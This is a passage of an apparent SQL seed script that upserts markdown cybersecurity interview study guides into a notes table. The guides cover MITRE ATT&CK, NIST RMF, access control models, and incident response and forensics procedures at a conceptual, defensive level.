| 9 | **Discovery** | Understand the target environment |
| 10 | **Lateral Movement** | Move through the network to reach objectives |
| 11 | **Collection** | Gather data of interest |
| 12 | **Command and Control** | Establish communication with compromised systems |
| 13 | **Exfiltration** | Steal data from the target network |
| 14 | **Impact** | Disrupt availability or compromise integrity |

### How MITRE ATT&CK is Used

| Use Case | Description |
|----------|-------------|
| **Threat Intelligence** | Map observed attack behaviors to known techniques |
| **Detection Engineering** | Create detection rules based on known techniques |
| **Security Assessment** | Evaluate security coverage against the framework |
| **Red Teaming** | Simulate real-world attacks using documented techniques |
| **Incident Response** | Classify and understand attack patterns during incidents |
| **Security Gap Analysis** | Identify which techniques your defenses don't cover |

### Kill Chain vs MITRE ATT&CK

| Aspect | Cyber Kill Chain | MITRE ATT&CK |
|--------|-----------------|---------------|
| **Creator** | Lockheed Martin | MITRE Corporation |
| **Approach** | Linear, sequential phases | Non-linear matrix of tactics/techniques |
| **Focus** | Attack lifecycle (macro view) | Detailed adversary behaviors (micro view) |
| **Granularity** | 7 phases | 14 tactics, 200+ techniques, 400+ sub-techniques |
| **Best For** | Understanding attack flow | Detailed threat hunting & detection |

---

## 3. NIST Risk Management Framework (RMF)

### What is NIST RMF?
A **systematic, structured approach** developed by the National Institute of Standards and Technology (NIST) to help organizations **manage and mitigate cybersecurity risks**. Linked to NIST SP 800-53 (security controls) and FISMA (Federal Information Security Modernization Act).

### Key Characteristics
- **Comprehensive** — Covers all aspects of risk management
- **Flexible** — Adaptable to different organization types and sizes
- **Repeatable** — Cyclical process for continuous assessment
- **Measurable** — Incorporates metrics to evaluate effectiveness

### The 7 Steps of NIST RMF

#### Step 1: PREPARE
- **Purpose:** Set foundation for effective risk management
- **Activities:**
  - Establish organizational context (mission, objectives, priorities)
  - Develop risk management strategy and risk tolerance
  - Assign roles and responsibilities
  - Create communication and training plans
  - Establish risk executive function
  - Develop policies, procedures, and risk register
- **Outcomes:** Management roles identified, risk strategy established, continuous monitoring strategy developed

#### Step 2: CATEGORIZE
- **Purpose:** Classify information systems and determine adverse impact
- **Activities:**
  - System identification and boundary definition
  - Data classification (sensitivity levels)
  - Impact level determination (Low, Moderate, High) for CIA
  - Assign security categories
  - Tailor security controls from NIST SP 800-53
- **Outcomes:** System documented, security categorization completed, approved by authorizing official

#### Step 3: SELECT
- **Purpose:** Choose, tailor, and document security controls
- **Activities:**
  - Establish security control baseline from NIST SP 800-53
  - Tailor controls to specific system needs
  - Identify supplemental controls for unique risks
  - Consider continuous monitoring requirements
  - Align with organizational policies and regulations
- **Outcomes:** Control baselines selected/tailored, continuous monitoring strategy developed

#### Step 4: IMPLEMENT
- **Purpose:** Integrate selected controls into the system
- **Activities:**
  - Integrate controls into system architecture/design
  - Configuration management (secure baseline)
  - Security control documentation
  - Security training and awareness
  - Security testing (vulnerability assessments, pen testing)
  - Set up continuous monitoring capabilities
- **Outcomes:** Controls implemented, security plans updated

#### Step 5: ASSESS
- **Purpose:** Evaluate effectiveness of implemented controls
- **Activities:**
  - Security Control Assessment (SCA) — verify controls work correctly
  - Independent verification and validation (third-party assessment)
  - Continuous monitoring initiation
  - Assess residual risks
  - Review documentation accuracy
  - Generate assessment reports
- **Outcomes:** Assessment reports developed, remediation actions taken, plan of action and milestones created

#### Step 6: AUTHORIZE
- **Purpose:** Senior official makes risk-based decision to operate the system
- **Activities:**
  - Authorizing official evaluates assessment reports and residual risks
  - May impose conditions for authorization
  - Compile authorization package (reports, risk assessments, conditions)
  - Grant or deny Authorization to Operate (ATO)
  - Document decision and communicate to stakeholders
- **Outcomes:** Authorization package compiled, ATO granted/denied, risk responses provided

#### Step 7: MONITOR
- **Purpose:** Continuously monitor security posture (ongoing/iterative)
- **Activities:**
  - Real-time monitoring of security controls and events
  - Incident detection and response
  - Security control effectiveness measurement
  - Configuration management and tracking changes
  - Vulnerability management (scanning, patching)
  - Security awareness training (ongoing)
  - Audit trails and compliance reporting
  - Feedback loop back to other RMF steps
- **Outcomes:** Ongoing control assessments, continuous monitoring, periodic reauthorization

### NIST RMF Visual Flow
```
PREPARE → CATEGORIZE → SELECT → IMPLEMENT → ASSESS → AUTHORIZE → MONITOR
                                                                    ↓
                                                              (Cycle back)
```

---

## 4. Access Control Models

### What is Access Control?
A security mechanism that determines **who can access a specific resource** and **what actions they can perform** on that resource.

### Two Main Categories

### DAC (Discretionary Access Control)
- **The owner/creator decides** who can access the resource
- Uses **Access Control Lists (ACLs)** on objects
- **Decentralized** — owners can change ACLs anytime
- **Identity-based** — relies on the identity of the resource owner

| Pros | Cons |
|------|------|
| ✅ Flexible | ❌ Security risk (owner may grant inappropriate access) |
| ✅ Fine-grained control | ❌ No centralized control |
| ✅ Simple to implement | ❌ Challenging in large organizations |
| ✅ Cost effective | ❌ Difficult to track permissions |

### Non-DAC (Non-Discretionary) Access Control
- Access is **centrally managed** by policies and rules
- NOT at the discretion of the resource owner

| Pros | Cons |
|------|------|
| ✅ Better security (predefined policies) | ❌ Less flexible |
| ✅ Consistent access control | ❌ Complex to implement |
| ✅ Easier to manage at scale | ❌ Requires centralized authority |
| ✅ More scalable | ❌ Challenging in large organizations |

### Non-DAC Models in Detail

#### RBAC (Role-Based Access Control)
- Access based on **user's role/job function**
- Users assigned to **groups** → permissions assigned to groups
- **Example:** Hospital — Doctor group (view+edit records), Nurse group (view only), Admin group (financial data only)
- Enforces **least privilege**
- Prevents **privilege creep** (accumulation of unnecessary access over time)
- **T-BAC** (Task-Based) is similar but based on assigned tasks

#### Rule-Based Access Control
- Access based on **predefined global rules** applied to ALL subjects
- Rules defined by system admin
- **Example:** Firewall rules — allow only HTTP traffic, block specific IPs
- Rules are universal, not user-specific

#### ABAC (Attribute-Based Access Control)
- **Advanced version** of rule-based access control
- Access based on **specific attributes** (location, time, device, user characteristics)
- More **fine-grained** than rule-based
- **Example:** Allow access to File1 only for users in the US location, or only from company laptops
- Used in Software-Defined Networking (SDN)

#### MAC (Mandatory Access Control)
- Access based on **classification labels** (security clearance levels)
- Used in **high-security environments** (government, military)
- Also called **Lattice Model**
- Labels: Top Secret > Secret > Confidential

##### MAC Sub-Types:

| Model | Description | Example |
|-------|-------------|---------|
| **Hierarchical** | Higher clearance grants access to own level + ALL lower levels | Top Secret clearance → access TS + Secret + Confidential |
| **Compartmentalized** | Enforces **need-to-know**; each compartment is isolated; no access to other levels | Top Secret clearance → access ONLY the specific TS files needed for your job |
| **Hybrid** | Combination of hierarchical and compartmentalized | Elements of both models |

#### Risk-Based Access Control
- Uses **real-time intelligence** to make access decisions
- Factors analyzed: device (known/unknown), location, network (familiar IP), resource sensitivity
- Outcome: Normal login, additional MFA required, or device registration

### Access Control Models Summary

| Model | Basis | Control By | Example |
|-------|-------|-----------|---------|
| **DAC** | Owner's discretion | Resource owner | File permissions on Windows |
| **RBAC** | User role | Central admin | Hospital role-based access |
| **Rule-Based** | Global rules | System admin | Firewall rules |
| **ABAC** | User/resource attributes | Policy engine | Location-based access |
| **MAC** | Security labels | Central authority | Military classification |
| **Risk-Based** | Real-time context | Automated analysis | Adaptive MFA |

---

## 5. Access Control Types

### By Implementation Method

| Type | Description | Examples |
|------|-------------|---------|
| **Administrative** | Policies, procedures, and managerial controls | Access policies, password policies, user account management, RBAC implementation, security training, auditing |
| **Technical/Logical** | Software/hardware-based controls | Authentication (password, MFA, biometric), ACLs, encryption, firewalls, IDS/IPS, VPN, SIEM |
| **Physical** | Physical security measures | Barriers (fences, gates, turnstiles), locks & keys, access cards/badges, biometric systems, surveillance cameras, security guards, man traps, alarm systems |

### By Function

| Type | Purpose | Examples |
|------|---------|---------|
| **Preventive** | Proactively prevent unauthorized access | Fences, firewalls, access controls, AV, security training, separation of duties, data classification |
| **Detective** | Detect unauthorized access after it occurs | Security logging/auditing, SIEM, IDS, cameras, UBA (User Behavior Analysis), honeypots, security audits |
| **Corrective** | Mitigate impact and restore after a breach | Incident response plan, access revocation, system patches, password reset, system restoration, forensics |
| **Deterrent** | Discourage unauthorized access attempts | Warning signs, visible cameras, security guards, lighting, alarm systems, security patrols |
| **Recovery** | Restore normal operations after an incident | IR plan execution, system restoration from backups, patch management, system hardening, lessons learned |
| **Directive** | Direct subjects to comply with security policies | Exit signs, notifications, security policy requirements |
| **Compensating** | Supplementary controls when primary controls aren't sufficient | MFA (when passwords alone aren't enough), VPN, data encryption, SIEM, network segmentation, redundancy |

> **Key Insight:** Controls can belong to MULTIPLE categories. Example: Security guards are preventive AND detective AND deterrent. Job rotation is preventive AND detective.

---

## 6. Interview Questions & Answers

### Q1: What is the Cyber Kill Chain?
**A:** The Cyber Kill Chain, developed by Lockheed Martin, describes 7 stages of a cyberattack: Reconnaissance (gathering intel), Weaponization (creating malware), Delivery (transmitting to target via phishing/USB), Exploitation (executing the exploit), Installation (installing backdoor), Command & Control (establishing communication), and Actions on Objectives (achieving the goal — data theft, ransomware). The key concept is that disrupting any stage breaks the chain.

### Q2: How does MITRE ATT&CK differ from the Cyber Kill Chain?
**A:** The Kill Chain is a linear, sequential model (7 phases) showing the high-level attack lifecycle — it's great for understanding attack flow. MITRE ATT&CK is a non-linear, detailed matrix with 14 tactics and 200+ techniques based on real-world observations — it's better for threat hunting, detection engineering, and assessing security coverage. They complement each other: Kill Chain for macro understanding, ATT&CK for micro-level detail.

### Q3: Explain the NIST RMF steps.
**A:** NIST RMF has 7 steps: (1) Prepare — establish context, risk strategy; (2) Categorize — classify systems and data by impact level; (3) Select — choose security controls from NIST SP 800-53; (4) Implement — integrate controls into system design; (5) Assess — evaluate control effectiveness; (6) Authorize — senior official grants Authorization to Operate; (7) Monitor — continuous monitoring and periodic reauthorization. It's a cyclical process.

### Q4: What is the difference between DAC and MAC?
**A:** DAC (Discretionary Access Control) — the resource OWNER decides who gets access. It's flexible but decentralized with security risks. MAC (Mandatory Access Control) — access is based on security clearance LABELS controlled by a central authority. It's more secure but rigid. DAC is used in general environments; MAC is used in high-security environments like military (Top Secret/Secret/Confidential levels).

### Q5: Explain RBAC and why it prevents privilege creep.
**A:** RBAC assigns permissions to ROLES (groups), not individual users. When users change roles, they're moved to a new group — automatically gaining appropriate permissions and losing old ones. This prevents privilege creep (accumulation of unnecessary permissions over time). Example: Moving from Customer Service to Finance — remove from CS group, add to Finance group.

### Q6: What is the difference between preventive and detective access controls?
**A:** Preventive controls proactively PREVENT unauthorized access (firewalls, fences, encryption, security training). Detective controls DETECT unauthorized access after it occurs (SIEM, IDS, security auditing, cameras, honeypots). Both are needed: preventive controls reduce incidents, detective controls catch what slips through.

### Q7: What are compensating controls?
**A:** Compensating controls are supplementary security measures implemented when primary controls are insufficient, impractical, or not feasible. Examples: MFA when password policies alone aren't strong enough, VPN for secure remote access, data encryption when storage systems have vulnerabilities, SIEM for enhanced monitoring. They compensate for gaps in primary controls.

### Q8: What is ABAC and how does it differ from RBAC?
**A:** RBAC assigns access based on user's ROLE (group membership). ABAC is more granular — it considers multiple ATTRIBUTES like location, time, device type, clearance level. Example: "Allow access only from company laptops in the US during business hours." ABAC provides finer-grained access control but is more complex to manage.

---

## 7. Quick Reference Tables

### Cyber Kill Chain at a Glance

| Phase | Activity | Defense |
|-------|----------|---------|
| Reconnaissance | Information gathering | Limit exposure, monitor scanning |
| Weaponization | Create malware | Threat intelligence |
| Delivery | Send to target | Email filtering, user training |
| Exploitation | Execute exploit | Patching, IDS/IPS |
| Installation | Install backdoor | EDR, whitelisting |
| C2 | Establish comms | DNS filtering, egress monitoring |
| Actions | Achieve objective | DLP, segmentation, IR |

### NIST RMF 7 Steps

| Step | Action | Key Outcome |
|------|--------|-------------|
| Prepare | Establish context & strategy | Risk strategy, roles defined |
| Categorize | Classify systems & data | Security categories assigned |
| Select | Choose controls | Control baseline tailored |
| Implement | Deploy controls | Controls integrated into systems |
| Assess | Evaluate effectiveness | Assessment reports, remediation |
| Authorize | Risk-based decision | ATO granted/denied |
| Monitor | Continuous monitoring | Ongoing assessment & feedback |

### Access Control Models Comparison

| Model | Who Decides? | Basis | Flexibility | Security |
|-------|-------------|-------|-------------|----------|
| DAC | Resource owner | Identity | High | Lower |
| RBAC | Central admin | Role | Moderate | Moderate |
| ABAC | Policy engine | Attributes | High | High |
| MAC | Central authority | Labels | Low | Highest |
| Rule-Based | System admin | Global rules | Low | Moderate |
| Risk-Based | Automated | Real-time context | Dynamic | High |

---

## 8. Key Takeaways

1. ✅ **Cyber Kill Chain** = 7 phases (Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions)
2. ✅ **MITRE ATT&CK** = 14 tactics, 200+ techniques — detailed adversary behavior knowledge base
3. ✅ Kill Chain = **macro/linear** | ATT&CK = **micro/non-linear** — they complement each other
4. ✅ **NIST RMF** = 7 steps (Prepare → Categorize → Select → Implement → Assess → Authorize → Monitor)
5. ✅ **DAC** = owner decides | **MAC** = labels/clearance | **RBAC** = roles | **ABAC** = attributes
6. ✅ **RBAC prevents privilege creep** by assigning permissions to roles, not individuals
7. ✅ **MAC** has two models: Hierarchical (access to lower levels) and Compartmentalized (need-to-know)
8. ✅ Access control types by function: Preventive, Detective, Corrective, Deterrent, Recovery, Directive, Compensating
9. ✅ Controls can belong to **multiple categories** (e.g., cameras are preventive + detective + deterrent)
10. ✅ **Compensating controls** supplement primary controls when they're insufficient or impractical

---

> 📌 **Previous:** [Part 3: Attacks, Threats & Countermeasures](./Study_Guide_Part3_Attacks_Threats_Countermeasures.md)  
> 📌 **Next:** [Part 5: Incident Response & DFIR](./Study_Guide_Part5_Incident_Response_DFIR.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part5_Incident_Response_DFIR$VELSEC$, $VELSEC$Study Guide Part5 Incident Response Dfir$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 5: Incident Response & Digital Forensics (DFIR)

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: NIST SP 800-61 IR Lifecycle, DFIR 10-Step Process, IR Interview Q&A, Evidence Handling, Post-Incident Review

---

## Table of Contents

1. [What is Incident Response?](#1-what-is-incident-response)
2. [NIST SP 800-61 IR Lifecycle (4 Phases)](#2-nist-sp-800-61-ir-lifecycle-4-phases)
3. [DFIR — Digital Forensics & Incident Response (10 Steps)](#3-dfir--digital-forensics--incident-response-10-steps)
4. [Evidence Handling & Chain of Custody](#4-evidence-handling--chain-of-custody)
5. [IR Plan Development](#5-ir-plan-development)
6. [Interview Questions & Answers](#6-interview-questions--answers)
7. [Quick Reference Tables](#7-quick-reference-tables)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. What is Incident Response?

**Incident Response (IR)** is the organized approach to addressing and managing the aftermath of a security breach or cyberattack. The goal is to:

- **Minimize damage** and reduce recovery time and costs
- **Contain the threat** to prevent further spread
- **Preserve evidence** for investigation and legal proceedings
- **Learn from incidents** to improve security posture
- **Comply with regulatory requirements** (GDPR, HIPAA, PCI-DSS)

### Security Event vs Security Incident

| Concept | Definition | Example |
|---------|-----------|---------|
| **Security Event** | Any observable occurrence in a system or network — can be routine or significant | User login, file access, failed login attempt |
| **Security Incident** | A security event that represents a REAL or POTENTIAL threat to CIA and requires investigation and response | Data breach, malware infection, unauthorized access, DDoS attack |

> **Key Point:** Not all security events are incidents. A failed login attempt is an event. Multiple failed login attempts from the same IP targeting multiple accounts is likely an incident.

---

## 2. NIST SP 800-61 IR Lifecycle (4 Phases)

### Phase 1: Preparation
**Purpose:** Establish IR capability before incidents occur

| Activity | Description |
|----------|-------------|
| **IR Team Formation** | Assemble a dedicated IR team with clear roles and responsibilities |
| **IR Plan Development** | Document procedures, escalation paths, communication protocols |
| **Tool Deployment** | Deploy SIEM, EDR, IDS/IPS, forensic tools |
| **Training & Exercises** | Conduct tabletop exercises, simulations, and regular training |
| **Communication Plans** | Define internal/external communication channels and stakeholders |
| **Documentation Templates** | Prepare incident report templates, runbooks, playbooks |
| **Baseline Establishment** | Document normal system behavior for anomaly detection |

### Phase 2: Detection & Analysis
**Purpose:** Identify and validate security incidents

| Activity | Description |
|----------|-------------|
| **Monitoring** | Continuous monitoring via SIEM, EDR, IDS/IPS, log analysis |
| **Alert Triage** | Classify alerts by severity (Critical/High/Medium/Low) |
| **Incident Validation** | Confirm whether the alert is a true positive or false positive |
| **Impact Assessment** | Determine scope, affected systems, data at risk |
| **Categorization** | Classify incident type (malware, phishing, unauthorized access, etc.) |
| **Prioritization** | Prioritize based on impact, urgency, and affected assets |
| **IOC Identification** | Identify Indicators of Compromise (file hashes, IPs, domains) |
| **Documentation** | Begin documenting timeline, findings, and evidence |

### Phase 3: Containment, Eradication & Recovery
**Purpose:** Stop the spread, remove the threat, and restore operations

#### Containment
| Strategy | Description |
|----------|-------------|
| **Short-term Containment** | Immediate actions to stop the spread (isolate systems, block IPs, disable accounts) |
| **Long-term Containment** | Implement temporary fixes while preparing for full eradication (patch systems, add monitoring) |
| **Evidence Preservation** | Capture forensic images, memory dumps, and logs BEFORE making changes |

#### Eradication
| Activity | Description |
|----------|-------------|
| **Root Cause Analysis** | Identify and eliminate the root cause of the incident |
| **Malware Removal** | Remove all malicious code, backdoors, and artifacts |
| **Vulnerability Remediation** | Patch vulnerabilities that were exploited |
| **Account Remediation** | Reset compromised credentials, review access permissions |
| **System Hardening** | Apply security configurations to prevent recurrence |

#### Recovery
| Activity | Description |
|----------|-------------|
| **System Restoration** | Restore from clean backups or rebuild compromised systems |
| **Validation** | Verify systems are clean and functioning normally |
| **Monitoring** | Enhanced monitoring for signs of re-infection or lingering threats |
| **Phased Return** | Gradually bring systems back online with careful observation |

### Phase 4: Post-Incident Activity (Lessons Learned)
**Purpose:** Learn from the incident and improve

| Activity | Description |
|----------|-------------|
| **Post-Incident Review** | Conduct a formal review meeting with all stakeholders |
| **Root Cause Documentation** | Document the root cause, attack vector, and timeline |
| **Gap Analysis** | Identify what worked, what didn't, and what needs improvement |
| **Policy/Procedure Updates** | Update IR plans, runbooks, and security policies |
| **Training Updates** | Incorporate lessons into training programs |
| **Metrics & Reporting** | Track MTTD (Mean Time to Detect), MTTR (Mean Time to Respond) |
| **Evidence Retention** | Retain evidence per legal and regulatory requirements |

---

## 3. DFIR — Digital Forensics & Incident Response (10 Steps)

### The 10-Step DFIR Process

#### Step 1: Preparation
- Have IR team, tools, and procedures ready BEFORE an incident
- Deploy forensic workstations, chain of custody forms, evidence bags
- Conduct regular training and tabletop exercises

#### Step 2: Identification
- Detect and identify the security incident
- Sources: SIEM alerts, IDS/IPS, user reports, threat intelligence feeds
- Determine: What happened? When? Where? Who is affected?

#### Step 3: Containment
- Stop the incident from spreading
- Short-term: Isolate affected systems, block malicious IPs/domains
- Long-term: Apply temporary patches, increase monitoring
- **Critical:** Preserve evidence BEFORE containment actions

#### Step 4: Evidence Collection
- Collect volatile data FIRST (memory, running processes, network connections)
- Then collect non-volatile data (hard drive images, log files)
- Follow **order of volatility**: Registers → Cache → RAM → Disk → Logs → Archives
- Use write-blockers for disk imaging
- Calculate and verify hashes (SHA-256) for integrity

#### Step 5: Evidence Preservation
- Maintain **chain of custody** — document who handled evidence, when, and why
- Store evidence in secure, tamper-proof locations
- Create forensic copies — NEVER work on original evidence
- Document storage conditions, access logs

#### Step 6: Analysis
- Analyze collected evidence to reconstruct the incident
- **Timeline Analysis** — Build chronological timeline of events
- **Malware Analysis** — Static and dynamic analysis of malicious code
- **Log Analysis** — Correlate logs from multiple sources
- **Memory Analysis** — Examine RAM for processes, network connections, injected code
- **File System Analysis** — Examine file modifications, deletions, hidden files

#### Step 7: Eradication
- Remove the root cause and all traces of the threat
- Remove malware, backdoors, unauthorized accounts
- Patch exploited vulnerabilities
- Reset compromised credentials

#### Step 8: Recovery
- Restore affected systems to normal operation
- Rebuild from clean backups if necessary
- Validate system integrity before reconnecting
- Implement enhanced monitoring

#### Step 9: Reporting
- Create comprehensive incident report documenting:
  - Incident summary and timeline
  - Affected systems and data
  - Root cause analysis
  - Actions taken
  - Evidence collected
  - Recommendations for improvement
- Reports for: management, legal, compliance, law enforcement (if applicable)

#### Step 10: Lessons Learned
- Conduct post-incident review meeting
- Document what worked well and what needs improvement
- Update IR plans, procedures, and playbooks
- Incorporate findings into security training
- Implement recommended security improvements
- Track metrics (MTTD, MTTR, number of incidents)

---

## 4. Evidence Handling & Chain of Custody

### Order of Volatility (Collect First → Last)

| Priority | Evidence Type | Volatility |
|----------|--------------|------------|
| 1 | CPU Registers, Cache | Most volatile |
| 2 | RAM (Memory) | Very volatile |
| 3 | Running Processes, Network Connections | Volatile |
| 4 | Hard Drive / Disk Images | Less volatile |
| 5 | Log Files (local) | Less volatile |
| 6 | Archived Data, Backups | Least volatile |

### Chain of Custody Requirements
- **Who** collected the evidence
- **When** it was collected (date/time)
- **Where** it was stored
- **How** it was transported
- **Who** had access to it at each point
- **What** was done with it (analysis, copying)

### Evidence Integrity
- Always calculate **cryptographic hashes** (SHA-256) of evidence
- Hash BEFORE and AFTER collection to prove no tampering
- Use **write-blockers** when imaging disks
- Work on **forensic copies**, never originals
- Document EVERYTHING

---

## 5. IR Plan Development

### Essential Components of an IR Plan

| Component | Description |
|-----------|-------------|
| **Purpose & Scope** | Define what constitutes an incident and what's covered |
| **Roles & Responsibilities** | IR team members, management, legal, HR, communications |
| **Incident Classification** | Severity levels (Critical/High/Medium/Low) and categories |
| **Escalation Procedures** | When and to whom incidents should be escalated |
| **Communication Plan** | Internal and external communication protocols |
| **Response Procedures** | Step-by-step procedures for different incident types |
| **Evidence Handling** | Collection, preservation, and chain of custody procedures |
| **Recovery Procedures** | System restoration and business continuity |
| **Reporting Requirements** | Regulatory reporting timelines and stakeholders |
| **Review & Update Schedule** | Regular review and improvement cycle |

### IR Team Roles

| Role | Responsibility |
|------|---------------|
| **IR Manager/Lead** | Oversees the entire response process, coordinates team |
| **SOC Analyst** | Monitors, detects, and performs initial triage |
| **Forensic Analyst** | Collects and analyzes digital evidence |
| **Threat Intelligence** | Provides context about threat actors and TTPs |
| **Communications** | Manages internal/external communications |
| **Legal Counsel** | Advises on legal obligations, evidence admissibility |
| **Management** | Makes business decisions, authorizes containment actions |

---

## 6. Interview Questions & Answers

### Q1: What is the NIST Incident Response lifecycle?
**A:** NIST SP 800-61 defines 4 phases: (1) Preparation — establish IR team, tools, plans; (2) Detection & Analysis — monitor, detect, validate, and assess incidents; (3) Containment, Eradication & Recovery — contain the spread, remove the threat, restore systems; (4) Post-Incident Activity — lessons learned, update plans, improve. It's a cyclical process — lessons feed back into preparation.

### Q2: What is the difference between a security event and a security incident?
**A:** A security event is any observable occurrence in a system — it could be routine (user login) or significant (failed login). A security incident is a specific type of event that represents a real or potential threat to confidentiality, integrity, or availability and requires investigation and response (data breach, malware infection). Not all events are incidents, but all incidents are events.

### Q3: What is the order of volatility and why does it matter?
**A:** The order of volatility determines which evidence to collect first based on how quickly it disappears: CPU registers/cache (most volatile) → RAM/memory → running processes/network connections → disk data → log files → archives (least volatile). It matters because volatile data (like memory) is lost when a system is powered off, so we must capture it first.

### Q4: What is chain of custody?
**A:** Chain of custody is the documented chronological record of who handled evidence, when, and for what purpose. It ensures evidence integrity and admissibility in legal proceedings. It tracks: who collected it, when and where, how it was stored/transported, and who accessed it. Breaking the chain can make evidence inadmissible in court.

### Q5: How would you handle a ransomware incident?
**A:** (1) Immediately isolate affected systems to prevent spread. (2) Preserve evidence — capture forensic images before remediation. (3) Identify the ransomware variant and check for known decryptors. (4) Assess impact — what systems and data are affected? (5) Do NOT pay the ransom — notify law enforcement. (6) Restore from clean backups after verifying they're uninfected. (7) Patch the vulnerability that allowed initial access. (8) Conduct lessons learned review. (9) Update security controls and training.

### Q6: What is the purpose of the post-incident review?
**A:** To learn from the incident and improve future response. We review: what happened (root cause and timeline), what worked well, what failed, and what needs improvement. The outcomes include updated IR plans, improved security controls, new training material, and metrics tracking (MTTD/MTTR). It's critical for continuous improvement.

### Q7: What tools do you use in incident response?
**A:** SIEM (Splunk, QRadar) for log correlation and alerting; EDR (CrowdStrike, Defender for Endpoint) for endpoint detection; Network analysis tools (Wireshark, Zeek) for traffic analysis; Forensic tools (FTK, Autopsy, Volatility) for evidence analysis; Threat intelligence platforms for IOC lookups; Ticketing systems for incident tracking.

### Q8: What are IOCs (Indicators of Compromise)?
**A:** IOCs are artifacts or evidence that indicate a system has been compromised. Examples include: malicious IP addresses, suspicious domains, file hashes of known malware, unusual registry modifications, unexpected network connections, suspicious user behavior, and unauthorized file changes. IOCs are used for detection, threat hunting, and sharing threat intelligence.

### Q9: Explain the difference between containment and eradication.
**A:** Containment stops the incident from spreading (isolating systems, blocking IPs, disabling accounts) — it's about limiting damage NOW. Eradication removes the root cause and all traces of the threat (removing malware, patching vulnerabilities, resetting credentials). Containment is immediate; eradication is thorough. Containment happens before eradication.

### Q10: What metrics would you track for IR effectiveness?
**A:** Key metrics include: MTTD (Mean Time to Detect) — how quickly we identify incidents; MTTR (Mean Time to Respond/Resolve) — how quickly we contain and resolve; number of incidents by type/severity; false positive rate; number of incidents requiring escalation; cost per incident; recurrence rate; and compliance with SLAs.

---

## 7. Quick Reference Tables

### NIST IR Lifecycle Summary

| Phase | Purpose | Key Activities |
|-------|---------|---------------|
| Preparation | Build capability | Team, tools, plans, training |
| Detection & Analysis | Find & validate | Monitor, triage, assess, document |
| Containment/Eradication/Recovery | Stop, remove, restore | Isolate, remove threat, rebuild |
| Post-Incident | Learn & improve | Review, update, train, metrics |

### DFIR 10 Steps

| Step | Action | Key Concern |
|------|--------|-------------|
| 1. Preparation | Ready team & tools | Before incident occurs |
| 2. Identification | Detect incident | Alert sources, validation |
| 3. Containment | Stop the spread | Preserve evidence first |
| 4. Evidence Collection | Gather evidence | Order of volatility |
| 5. Evidence Preservation | Maintain integrity | Chain of custody |
| 6. Analysis | Investigate | Timeline, malware, logs |
| 7. Eradication | Remove threat | Root cause, patches |
| 8. Recovery | Restore operations | Clean backups, validation |
| 9. Reporting | Document findings | Stakeholder reports |
| 10. Lessons Learned | Improve | Update plans, training |

### IR Severity Levels

| Level | Description | Response Time | Example |
|-------|-------------|--------------|---------|
| **Critical** | Immediate threat to business operations | Immediate (< 1 hour) | Active ransomware, data breach |
| **High** | Significant risk, potential for major impact | < 4 hours | Compromised admin account |
| **Medium** | Moderate risk, limited impact | < 24 hours | Malware on single endpoint |
| **Low** | Minimal risk, no immediate threat | < 72 hours | Phishing attempt (no click) |

---

## 8. Key Takeaways

1. ✅ **NIST IR = 4 phases:** Preparation → Detection & Analysis → Containment/Eradication/Recovery → Lessons Learned
2. ✅ **DFIR = 10 steps:** Prep → ID → Contain → Collect → Preserve → Analyze → Eradicate → Recover → Report → Lessons
3. ✅ **Security event ≠ Security incident** — incidents require investigation and response
4. ✅ **Order of volatility:** Collect most volatile evidence FIRST (registers → RAM → disk → logs)
5. ✅ **Chain of custody** ensures evidence integrity and legal admissibility
6. ✅ **NEVER work on original evidence** — always use forensic copies
7. ✅ **Containment before eradication** — stop the spread, then remove the threat
8. ✅ **Post-incident review** is CRITICAL — drives continuous improvement
9. ✅ Track **MTTD and MTTR** as key IR effectiveness metrics
10. ✅ **Preparation is the most important phase** — you can't respond effectively without it

---

> 📌 **Previous:** [Part 4: Security Frameworks & Models](./Study_Guide_Part4_Security_Frameworks_Models.md)  
> 📌 **Next:** [Part 6: SOC Analyst Interview Scenarios](./Study_Guide_Part6_SOC_Analyst_Interview_Scenarios.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part6_SOC_Analyst_Interview_Scenarios$VELSEC$, $VELSEC$Study Guide Part6 Soc Analyst Interview Scenarios$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 6: SOC Analyst — Interview Questions & Scenarios

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: SOC Operations, Alert Triage, Entry-Level Q&A, Scenario-Based Questions, Escalation, Log Analysis

---

## Table of Contents

1. [What is a SOC?](#1-what-is-a-soc)
2. [SOC Analyst Roles & Responsibilities](#2-soc-analyst-roles--responsibilities)
3. [SOC Analyst Tiers](#3-soc-analyst-tiers)
4. [Entry-Level SOC Interview Q&A](#4-entry-level-soc-interview-qa)
5. [Scenario-Based SOC Questions](#5-scenario-based-soc-questions)
6. [Alert Triage & Investigation Process](#6-alert-triage--investigation-process)
7. [Threat Intelligence in the SOC](#7-threat-intelligence-in-the-soc)
8. [Key SOC Tools & Technologies](#8-key-soc-tools--technologies)
9. [Quick Reference Tables](#9-quick-reference-tables)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. What is a SOC?

A **Security Operations Center (SOC)** is a centralized team or facility responsible for **monitoring, detecting, and responding** to cybersecurity threats and incidents. It serves as the nerve center of an organization's cybersecurity.

### SOC Functions:
- **24/7 Monitoring** — Continuous surveillance of network traffic, system logs, and security alerts
- **Threat Detection** — Identifying anomalies, suspicious activities, and potential security incidents
- **Incident Response** — Investigating and responding to confirmed security incidents
- **Threat Intelligence** — Staying informed about emerging threats and attack vectors
- **Compliance** — Ensuring adherence to security policies and regulatory requirements
- **Continuous Improvement** — Enhancing security measures, policies, and procedures

---

## 2. SOC Analyst Roles & Responsibilities

| Responsibility | Description |
